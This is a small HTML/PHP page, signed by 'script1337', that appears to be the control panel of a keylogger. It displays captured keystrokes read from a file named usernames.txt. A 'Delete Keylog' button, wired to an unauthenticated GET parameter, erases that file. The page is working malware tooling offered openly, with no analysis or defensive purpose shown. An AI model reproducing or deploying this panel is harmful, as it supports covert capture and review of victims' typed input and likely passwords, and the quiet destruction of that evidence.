<!DOCTYPE html>
<html lang="en" >

<head>
  <meta charset="UTF-8">
  <title>Note</title>


  <link rel='stylesheet' href='http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css'>

      <link rel="stylesheet" href="./style.css">


</head>

<body>

  <link href='https://fonts.googleapis.com/css?family=Josefin+Sans:400,700,300' rel='stylesheet' type='text/css'>
<section class="bg">
  <div class="note">
  <h3 style="color:Grey;">Coded by script1337</h3>
<p style="color:Grey;">for more = https://www.youtube.com/channel/UCnhRlqXE7h9Q0OR4Vd1YL1A</p>
    <div class="ui-circle ui-element">
      <div class="ui-icon">
        <h5>!</h5>
      </div>
    </div>
    <div class="ui-context">
      <h5>Keystroks</h5>
      <textarea rows="4" cols="80" style="background-color:Black;color:Grey;">
      <?php
      $file = "usernames.txt";

      if (file_exists($file))
      {
        $myfile = fopen($file, "r") or die("Unable to open file!");
        echo fgets($myfile);
        fclose($myfile);
      }
      else
      {
        echo " Opps Any keylog does not exists";
                            }
      ?>
      </textarea>
    </div>
<form method="GET">
      <button type="submit" class="bcls-button" id="Delete" name="Del" value="RUN">Delete Keylog</button>
      <?php
  if($_GET['Del']){
    $myFile = "usernames.txt";
    unlink($myFile) or die("Couldn't delete file");
  }
?>
</form>
  </div>
</section>
  <script src='http://cdnjs.cloudflare.com/ajax/libs/react/0.14.3/react.min.js'></script>
<script src='https://code.jquery.com/jquery-2.2.4.min.js'></script>
<script src='http://cdnjs.cloudflare.com/ajax/libs/d3/3.5.5/d3.min.js'></script>



    <script  src="./script.js"></script>




</body>

</html>
